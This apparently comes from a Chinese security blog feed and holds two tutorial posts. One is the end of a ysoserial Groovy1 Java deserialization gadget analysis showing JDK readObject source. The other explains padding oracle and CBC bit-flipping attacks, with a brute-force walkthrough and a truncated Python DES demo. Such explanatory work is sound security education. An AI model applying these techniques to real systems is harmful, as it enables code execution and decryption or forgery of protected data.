function">getInstance</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Class is no longer an annotation type; time to punch out</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">>></span> memberTypes <span class="token operator">=</span> annotationType<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// If there are annotation members without values, that</span><span class="token comment" spellcheck="true">// situation is handled by the invoke method.</span><span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> memberValue <span class="token operator">:</span> memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    String name <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> memberType <span class="token operator">=</span> memberTypes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>memberType <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// i.e. member still exists</span>        Object value <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>memberType<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span>                value <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            memberValue<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>                    <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>                            annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们在这段代码里看到了一个熟悉的影子，在readObject方法里有一个foreach循环,里面有一个名字叫memberValues的变量调用的entrySet()，也就是说，如果这个memberValues里面存储的是我们之前构造好的那个实现了Map接口的代理对象的话，那就意味着这里就像一个炸弹的引爆点一样，会瞬间执行我们刚才所分析的代码执行路径，并最终执行我们提前包装好的代码。</p><p>好，那接下来的问题是这个变量我们可以控制么？如果该变量不接受外部传入的参数那么这个点就变的毫无价值。但是我们通过分析惊喜的发现，memberValues是一个全局变量，接受的恰好就是我们精心构造的那个可以执行代码的代理对象。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialgroovy1/35.png" alt="35"></p><p>AnnotationInvocationHandler对我们来说就是一个反序列化的入口点，就像是一个引爆器一样。而我们封装好的那个代理对象就是炸弹，在AnnotationInvocationHandler进行序列化时被封装了进去作为AnnotationInvocationHandler对象一个被序列化的属性存在着，等到AnnotationInvocationHandler对象被反序列化时，就瞬间爆炸，一系列的嵌套调用瞬间到达执行Runtime.getRuntime().exec()的位置</p><p>我们以上所介绍的AnnotationInvocationHandler是低版本的JDK中的，我所使用的是1.7.0_21这个版本来做的演示，但是经过验证高版本的JDK中的AnnotationInvocationHandler这个类虽然经过了修改但是仍然存在这个问题，还是可以触发我们的gadget以下是JDK1.8.0._211版本的AnnotationInvocationHandler类的readObject方法的源码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        GetField var2 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">readFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">var3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>Object<span class="token punctuation">)</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Map var4 <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"memberValues"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>Object<span class="token punctuation">)</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        AnnotationType var5 <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            var5 <span class="token operator">=</span> AnnotationType<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> var13<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Map var6 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        LinkedHashMap var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String var10<span class="token punctuation">;</span>        Object var11<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>Iterator var8 <span class="token operator">=</span> var4<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> var8<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> var7<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>var10<span class="token punctuation">,</span> var11<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Entry var9 <span class="token operator">=</span> <span class="token punctuation">(</span>Entry<span class="token punctuation">)</span>var8<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var10 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var9<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var11 <span class="token operator">=</span> null<span class="token punctuation">;</span>            Class <span class="token class-name">var12</span> <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token punctuation">)</span>var6<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var12 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                var11 <span class="token operator">=</span> var9<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var12<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>var11 <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    var11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>var11<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> var11 <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Method<span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span></code></pre><p>可以看到出发点仍然在foreach循环的条件里面，只不过是获取构造好的动态代理对象的方式发生了一点变化，但是仍然不会影响我们使用。</p><p>至此ysoserial Java 反序列化系列第一集 Groovy1原理分析结束</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实网上反序列化的文章有很多，但是不知为何大家讲解反序列化漏洞时都是用CC链也就是Apache.CommonsCollections来进行举例，平心而论笔者觉得这个利用链一开始没接触过反序列化的同学直接理解还有一定的难度的，难在整个CC链的调用看上去略微复杂，并不是难在反序列化的部分。所笔者挑了一个个人觉得调用链比较清晰明了的Groovy来进行java 反序列化分析的第一篇文章，来帮助大家能更快速的了解java 反序列化漏洞。虽然Groovy1这个gadget在实际生产环境中碰的的概率可能少之又少，但是作为一个反序列化入门学习的例子笔者个人觉得还是比较适合的。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Groovy </tag>
            
            <tag> ysoserial </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Padding Oracle原理深度解析</title>
      <link href="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/"/>
      <url>/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="padding-oracle原理深度解析"><a href="#padding-oracle原理深度解析" class="headerlink" title="padding oracle原理深度解析"></a>padding oracle原理深度解析</h1><h2 id="1、padding-oracle-简介"><a href="#1、padding-oracle-简介" class="headerlink" title="1、padding oracle 简介"></a>1、padding oracle 简介</h2><p>首先我们先看一下padding oracle漏洞简单描述，以下是来自百度百科的解释</p><p>Padding的含义是“填充”，在解密时，如果算法发现解密后得到的结果，它的填充方式不符合规则，那么表示输入数据有问题，对于解密的类库来说，往往便会抛出一个异常，提示Padding不正确。Oracle在这里便是“提示”的意思，一开始看到漏洞名称中有oracle的时候我也被误导了，单实际上和甲骨文公司没有任何关系。</p><h2 id="2、常见的加密模式"><a href="#2、常见的加密模式" class="headerlink" title="2、常见的加密模式"></a>2、常见的加密模式</h2><p>首先我们知道，加密的方法有很多种，分为两大类 对称加密和非对称加密，</p><p>对称加密又称单密钥加密，也就是字面意思，加密解密用的都是同一个密钥，常见的对称加密算法，例如DES，3DES和AES等</p><p>非对称加密，就是说密钥分两个，一个公钥，一个私钥，加解密过程就是公钥加密私钥解密和私钥加密公钥匙解密，常见的非对称加密算法有，RSA DSA等</p><p>初次接触这个漏洞的人，多会认为此漏洞是一个加密算法的漏洞，然而实际却并非如此随着讲解就会明白真正的漏洞点出在何处</p><p>我们常用的加密可以分为两部分来理解，一部分是加密算法，这部分的话过于高深需要相当程度的密码学知识做基础。而另一部分，就是加密模式，这部分相较于加密算法来说就简单太多了，而此次出现padding oracle漏洞的就是CBC加密模式</p><p>这里我从网上截几个图解释下这个CBC模式是个什么东西，出了这个CBC模式外还有哪些个加密模式。</p><p>AES是对称加密，对称加密呢有两大类加密模式，即分组加密和流加密，AES分组加密有五种加密模式</p><p>1.电码本模式（Electronic Codebook Book (ECB)）；</p><p>2.密码分组链接模式（Cipher Block Chaining (CBC)）；</p><p>3.计算器模式（Counter (CTR)）；</p><p>4.密码反馈模式（Cipher FeedBack (CFB)）；</p><p>5.输出反馈模式（Output FeedBack (OFB)）。</p><p>此次出现问题的是CBC加密模式，为了方便理解加密模式 我们就顺便也讲一下ECB加密模式。</p><h2 id="3、ECB加密模式简介"><a href="#3、ECB加密模式简介" class="headerlink" title="3、ECB加密模式简介"></a>3、ECB加密模式简介</h2><p>首先我们要明白加密算法和加密模式是两个概念，AES是加密算法，加密算法是通过接收方和发送方协商产生密钥，结合一系列的各种位运算之后得出的结果。而加密模式是在加密算法的基础上，把加密的方式变得更加复杂一点，首先我们看下最简单直接的ECB加密模式</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/1.png" alt="1"></p><p>可以看到ECB加密模式的思想非常直白，就是把明文分为等长的块，然后一块一块的加密，最后再把每一块加密后的密文拼接在一起。这就是ECB加密模式</p><h2 id="4、CBC加密模式简介"><a href="#4、CBC加密模式简介" class="headerlink" title="4、CBC加密模式简介"></a>4、CBC加密模式简介</h2><p>接下来就讲一讲这次的重点，也就是CBC加密模式</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/2.png" alt="2"></p><p>首先多了一个IV，这个IV我们一般称作初始向量，首先明文还是那个明文，分块还是要分块，在通过AES加密之前我们需要先将明文块0，也就是第一块明文，和我们的初始向量IV做异或操作，这个初始向量IV是随机的，而且长度是和我们的每一块明文块等长，因为要按位进行异或嘛。这样无疑就在加密之前就已经先行打乱的我们的明文，与初始化向量异或后的明文，我们暂且称它为中间值，我们此时再对这个中间值进行AES加密，这样第一块明文的加密就完成了。</p><p>从上面哪个截图我们不难看的出，CBC模式是一个链式结构，这个链接的关键点就在于，我们加密第二块明文的时候同样也需要一个初始化向量来和我们第二块明文也就是明文块1来进行异或，那这个初始话向量哪来的呢，总不可能系统为每一块明文都分配一个随机的初始化向量吧，这样成本过高。所以我们将第一块明文加密后的密文，作为第二个明文加密时的初始化向量，而这个就是这个链式结构的连接点，后续的步骤就是不断重复加密第一块明文时所做的操作，直至最后一块明文加密完成。</p><p>感觉上CBC模式比ECB模式流程上复杂这么多，应该比ECB模式更安全才对，理论上讲确实，因为引入了初始化向量这个一个操作，所以CBC加密的结果随机性更高，相同的明文ECB加密每一次的结果都是相同的，也就是明文和密文一对一。 而CBC由于多了一个随机的初始化向量，所以同样的明文CBC每一次加密出来的结果都是不一样的。由此来看CBC明显比ECB更安全，但是CBC这个模式在设计上存在缺陷  ，而这个缺陷就导致了著名的padding oracle攻击</p><p>既然有加密，那肯定就会有解密，而且此次被攻击的是服务端，那肯定就是我们客户端发送加密数据，然后服务端解密我们的数据，然后给我们反馈，要么解密成功要么解密不成功，而攻击就发生在服务端解密和反馈这个过程。</p><p>不知道讲解到此处大家心里有没有一个疑惑。</p><p>回过头来看一下，前文说了分组加密的分组要怎么样？等长对不对 而且 初始化向量和每一组分组都要等长对不对？</p><p>用AES和DES两个加密算法来举例子 AES的分组长度为每块16字节，DES呢则是每块8字节，那么怎么能保证我们的明文长度是16或者8的整数倍呢？</p><p> 当然没办法保证，所以我们就要采取措施强制让明文为16或者8的整数倍，最直接的方法自然就是直接填充，不够就补到它够为止。这也就是所谓的padding 填充。</p><h2 id="5、padding-oracle-原理"><a href="#5、padding-oracle-原理" class="headerlink" title="5、padding oracle 原理"></a>5、padding oracle 原理</h2><p> 而CBC加密模式的设计者自然也考虑到了这问题，剩余的几位当然不能随便填充，而要填充一些有价值的数值。</p><p>假如说此时我们按8字节为一个明文分组，分到最后发现最后一组缺了一个字节，程序不会填一些随机数，亦或者将不够的位数全填零。CBC模式最后的填充方法，就是缺了一位就填一个0x01,缺了两位就填两个0x02,缺了三位就填三个0x03,以此往后类推缺n个就填n个0x0n。哪怕当明文正好时分组的整数倍时，也会填充8个0x08，即使是整数倍也要填充。这样就导致了无论我们明文的长度是多少，我们CBC模式加密是都会在明文的最后进行填充，以确保分段的长度是8的整数倍。</p><p>不理解的可以看一下具体的填充算法</p><pre><code>add = length - (count % length)plaintext = plaintext + ('\0' * add) #填充</code></pre><p>通过下图可以更好的让我们理解这种填充的思想</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/3.png" alt="3"></p><p>之所以选择这么填充，就肯定是有它的道理的。</p><p>前文说了，有加密就有解密，那解密的时候这个填充位就会起到很大的作用，CBC模式解密的流程其实就是加密流程再反过来。</p><p>我们再看一下加密的流程</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/4.png" alt="4"></p><p>下面是解密的流程</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/5.png" alt="5"></p><p>此时我们先思考一个问题就是我们平常是通过什么来判断一个业务逻辑或者是功能点是存在漏洞的？那就是通过服务端的回显来判断对不对？如果说服务端给我们的回复一直都是一样的我们能判断这个功能点就是存在漏洞么？举个例子拿暴力破解这个漏洞来说，通常都是用在攻击网站的登陆点上，通常存在暴力破解漏洞的登陆点都会返回这样的信息“该用户名不存在”，“密码输入错误”。通过这两条返回信息我们可以判断用户名是否存在和密码是否输入正确。判断的依据就是返回信息的不同，正是因为用户名错误和密码错误的返回消息的差异导致了我们可以去判断我们输入究竟是用户名有错还是密码有错。</p><p>而padding oracle攻击，同样是通过服务端返回的信息的差异而产生的，在这里我要先提一下解密时的一个步骤，同样也是我们padding oracle的核心利用点。</p><p>之前加密的时候我们就知道了，为了保证分组加密时每一组都能保证等长，我们在加密时需要对最后一组不等长的情况进行填充，缺n位就填n个0x0n。此时解密的时候这些个填充位就派上用场了，我们在解密步骤时，按照顺序，首先是密文第一组，会先被解密掉，揭秘出来的结果呢就是我们的初始向量IV和第一段明文异或的结果也就是我们之前说的中间值。此时我们将中间值和初始向量IV进行异或，得到的就是我们第一组的明文，然后以此类推知道解密完最后一组密文后。此时此刻，按理说程序会将解密好的数据交由业务代码来进行后续的判断，比如验证揭秘后的用户名密码是否匹配。或者用于校验用户身份的Cookie值是否正确。<br>理论是如此但是实际上这中间还有一个步骤就是，程序要判断明文最后的填充位是否正确。<br>这个判断本身是没问题的，可以直接排除掉一些错误的加密数据，和被人恶意篡改的数据。但是一旦判断出明文最后的填充位是错误的，返回给客户端的信息，给攻击者提供攻击思路。<br>首先如果密文解密成明文后，填充位判断正确，而且经过业务逻辑代码的校验后，也是正确，那么服务端会返回200的状态码。<br>如果密文解密成明文后，填充位判断正确，但是业务逻辑判断不通过，也就是说这个明文有问题，纳闷服务端会返回200或者300等状态码。<br>最后如果密文解密成明文后，填充位判断不正确，就会返回500等状态码。</p><p>不知道大家有没有发现一个问题就是，填充位的正确与否，服务端返回的状态码是不一样的！！</p><p>Padding orlace正是通过这一点的不同来做文章的</p><p>那么如何进行padding 我们首先就从一个简单的例子开始讲起，也是很多大佬都用的例子。</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/6.png" alt="6"></p><p>首先，以加密解密“TEST”这个字符串为例，“TEST”字符串总共占四个字符串，如果按8字节进行分组，那么很明显是不够的，所以我们需要补充4个0x04</p><p>然后由程序进行加密，得出加密的结果是”F851D6CC68FC9537”每两位16进制是一个字节，此时我们审视一下我们当前的已知条件</p><p>1.我们此时不是知道明文是什么，但是我们知道密文是“F851D6CC68FC9537”</p><p>2.同时我们还知道一个条件那就是该密文的初始化向量，没错，如果要进行padding oracle这个攻击的话，已知初始化向量是一个必须的条件。</p><p>3.同时我们可以和服务端进行交互，这个交互是指我们发送加密数据到服务端，服务端回判断我们发送的密文解密后填充位是否正确，并返回给我们填充位正确的状态码，或者填充位不正确的状态码。</p><p>刚才的已知条件中，我提到了初始化向量必须已知才能进行攻击，那么这个初始化向量在哪呢？</p><p>一般是在密文的头部</p><p>我们可以看到图中初始化向量的值是“6D367076036E2239”</p><p>举个例子，比如我们使用加密传输了一个值，值的名字叫padding</p><p>Padding= 6D367076036E2239F851D6CC68FC9537</p><p>我们可以看到“6D367076036E2239”放在密文的前面，又已知初始化向量和密文的分组等长所以，分组长度为8字节，那么初始化向量的长度自然也是8字节，由此我们就可以明确前八个字节是初始化向量，</p><p>理论上讲，“F851D6CC68FC9537”这段密文我们如果知道密钥的话，就可以直接解开这段密文得出他的明文，但是很明显我们不知道，如果知道密钥了那我们还折腾个啥</p><p>那么接下来的操作就是利用我们手上已有的条件，在不知道密钥的情况下得到这段密文的明文</p><p>首先根据解密步骤</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/7.png" alt="7"></p><p>服务端收到密文的时候回先对密文进行解密，也就是对“F851D6CC68FC9537”</p><p>这段密文进行解密，的到我们的中间值，注意此时中间值是多少我们并不知道，因为服务端不可能把中间值返回给我们。</p><p>然后通过中间值和初始化向量异或我们就可以得到“F851D6CC68FC9537”的明文</p><p>初始化向量我们是已知的也就是“6D367076036E2239”也就是说我们离得到明文就差一个中间值，如果我们知道中间值是多少，那我们直接异或运算一下就可以得出明文了，关键就在于怎么得到这个中间值？</p><p>还记得之前说的程序回判断填充位并返回不同的状态么？ </p><p>此时我们将初始化向量全部制为零,此时发送给服务端的数据就变成了</p><p>padding=0000000000000000F851D6CC68FC9537然后看图</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/8.png" alt="8"></p><p>还是一样的步骤，程序解密密文得到中间值，然后和初始化向量异或得到明文，然后程序再判断填充位是否正确。</p><p>我们知道0和数异或的结果都是该数本身</p><p>所以中间值和0异或的结果还是中间值本身，我们可以从图中看到异或的结果是3D，此时我们是不可能知道这个异或出来的结果是3D的，但是此时服务端会报一个错，那就是填充位错误，为什么会报这个错，因为之前说了，填充文在8个字节为分组的情况下，最多只可能填到8个0x08，所以怎么可能会有0x3D呢？</p><p>那怎么样才能不报这个错呢？以最后一位为例</p><p>如果此时异或出来的结果为 “39732322076a2601”也就是异或出来的结果最后一位为0x01时就不会报填充位错误了。但是后续还会在爆一个错误，那就是业务判断你这个解密出来的明文数据也就是“39732322076a2601”不正确，因为我们初始化向量都制为零的，所以这个明文当然是错误的，不过这都不重要。</p><p>此时我们知道了，当最终解除出来的明文的最后一位位0x01时，我们的程序就不会报填充位错误，那一次类推如果解出来为“39732322076a0202”“ 3973232207030303”…… “ 0808080808080808”时也不会报填充位错误。</p><p>所以我们从假如最后一位为0x01开始，由于中间是是固定不变的，我们就需要变化初始化向量的最后一个字节让其和中间值的最后一个字节异或的结果为0x01, 所以此时我们需要用到穷举的方法，一个字节的范围为，0x00-0xFF,最多也就是需要尝试256次，</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/9.png" alt="9"></p><p>此时我们根据上图可以看出，当最后一位异或结果为0x01时，我们此时的初始化向量为</p><p>‘’0000000000000066‘’  又已知0x01是中间值和初始化向量异或得出的结果，所以我们将此时我们用来爆破的初始化向量的最后一位，也就是“0x66”与0x01向异或，就可以得出真正的中间值的最后一个字节，也就是0x67。</p><p>以此类推，直到异或结果为“0808080808080808”，我们多需要尝试的次数，最多也不过256*8次也就是2048次，这样我们就可以绕过加密，从而直接获得密文的明文。</p><h2 id="6、CBC字节翻转攻击"><a href="#6、CBC字节翻转攻击" class="headerlink" title="6、CBC字节翻转攻击"></a>6、CBC字节翻转攻击</h2><p>以上的手段可以让我们绕过加解密从而直接获得明文，不知道大家有没有发现一个问题，来我们再次观察一下解密过程</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/5.png" alt="5"></p><p>解密的第一步，首先用后台用密钥，将密文解密然后将解密得出的中间值与初始化向量IV做异或操作，得到第一段密文的明文。</p><p>解密的第二步，首先用后台用密钥，将密文解密然后将解密得出的中间值与上一段密文做异或操作，得到第二段密文的明文。</p><p>不难看出，下一段明文的内容是受到上一段密文的影响的，那么是否存在我们通过修改前一段密文或者初始化向量来达到修改下一段密文的明文的效果</p><p>打个比方说我们明文是“admin”然后加密传输到后端，后端解密出来的结果是“bdmin”</p><p>可不可以实现呢？当然是可以的</p><p>首先我们再理一下这个过程，“admin”首先和初始化向量异或得到一个8字节的密文，然后由于按照8字节来划分，所以初始化向量自然也是8字节，为了方便传递给后台识别，初始化向量转化成8字节大小的十六进制数放在加密好的密文开头，然后发送给后台。</p><p>后台受到密文后，将前八字节的十六进制出提取出来作为初始化向量，然后将剩下的密文，使用密钥解密后然后和初始化向量做异或操作，得出最终的明文。</p><p>问题还是出在了解密过程中的异或操作，这个初始化向量是我们可控的</p><p>我们想要的结果就是密文和我们修改过后的初始化向量</p><p>此时我们要清楚一个基本的异或运算</p><p>我们使用“qwerasdf”来作为我们的初始化向量 “admin”作为要加密传输的明文，也就是说我们首先进行异或操作时是有“q”和“a”来进行异或的</p><p>所以有“q” xor “a” 来作为第一步，这个异或的结果会在后台用密钥解密出来后再与初始化向量“q”来异或得出明文“a”</p><p>所以此时有“q” xor “a” xor “q” == “a”这么一个式子</p><p>我们将“q” xor “a”的结果设为X</p><p>既X = “q” xor “a”</p><p>，X就是作为中间值被加密然后传到后台的</p><p>此时我们将X 作为参数再与我们的目标值“b”进行一次异或</p><p>也就是说 X  xor “b” 这个结果我们设为Y</p><p>此时得到Y == X xor “b”  </p><p>再根据上一个式子可以得到，Y = “q” xor “a” xor “ b”</p><p>已知X是未经修改的IV与明文异或的结果也就是所谓的中间值，也就说解密时X时作为解密时的中间值同样要参与到解密时的异或步骤，但是如果我们在传递数据时将“q”更改为我们的Y。让Y去和X进行异或操作，最终得到的结果就变成了”b“ ，这样我们就实现了更改明文的第一个字节，接下来的同样是进行重复操作。</p><p>这就是所谓的CBC字节翻转攻击的原理，下面贴出实现代码。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> des<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> PAD_PKCS5<span class="token keyword">import</span> binascii<span class="token comment" spellcheck="true"># 秘钥</span>KEY <span class="token operator">=</span> <span class="token string">'mHAxsLYz'</span><span class="token comment" spellcheck="true">#初始化向量</span>KEY2 <span class="token operator">=</span> <span class="token string">"qwerasdf"</span><span class="token keyword">def</span> <span class="token function">des_encrypt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    DES 加密    :param s: 原始字符串    :return: 加密后字符串，16进制    """</span>    secret_key <span class="token operator">=</span> KEY    iv <span class="token operator">=</span> KEY2    k <span class="token operator">=</span> des<span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span>None<span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    en <span class="token operator">=</span> k<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>s<span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>en<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">des_descrypt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>iv<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    DES 解密    :param s: 加密后的字符串，16进制    :return:  解密后的字符串    """</span>    secret_key <span class="token operator">=</span> KEY    iv <span class="token operator">=</span> iv    k <span class="token operator">=</span> des<span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span>None<span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    de <span class="token operator">=</span> k<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>s<span class="token 